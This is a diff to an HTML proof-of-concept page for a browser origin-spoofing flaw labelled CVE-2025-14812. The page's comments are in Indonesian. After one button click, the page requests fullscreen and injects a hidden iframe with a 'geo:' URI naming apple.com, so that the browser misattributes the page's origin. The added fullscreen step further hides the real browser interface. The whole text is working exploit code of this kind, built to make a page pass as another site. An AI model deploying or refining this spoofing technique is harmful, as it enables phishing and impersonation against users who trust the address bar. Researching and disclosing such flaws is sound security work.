@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>CVE-2025-14812 Inspired PoC</title>
+    <title>CVE-2025-14812 Inspired PoC with Fullscreen</title>
     <style>
       body, html {
         margin: 0;
@@ -53,8 +53,18 @@
       let statusInfo = document.getElementById("statusInfo");
 
       execButton.onclick = function () {
-        statusInfo.innerText = "Status: Deploying subframe origin context...";
+        statusInfo.innerText = "Status: Entering fullscreen & deploying origin context...";
         this.style.display = "none";
+
+        // Meminta mode Fullscreen secara bersamaan saat interaksi tombol sah (user gesture)
+        let docElement = document.documentElement;
+        if (docElement.requestFullscreen) {
+          docElement.requestFullscreen().catch((err) => {
+            console.debug("Fullscreen restricted:", err.message);
+          });
+        } else if (docElement.webkitRequestFullscreen) { /* Safari / Mobile Webkit */
+          docElement.webkitRequestFullscreen();
+        }
 
         try {
           // Membuat elemen iframe tersembunyi untuk memicu misattribution konteks asal 
@@ -66,7 +76,7 @@
           spoofFrame.src = "geo:0,0?q=apple.com";
           
           document.body.appendChild(spoofFrame);
-          statusInfo.innerText = "Status: Subframe URI-scheme dispatched. Evaluating omnibox state...";
+          statusInfo.innerText = "Status: Fullscreen active. Subframe URI-scheme dispatched.";
 
         } catch (err) {
           statusInfo.innerText = "Status: Execution error: " + err.message;
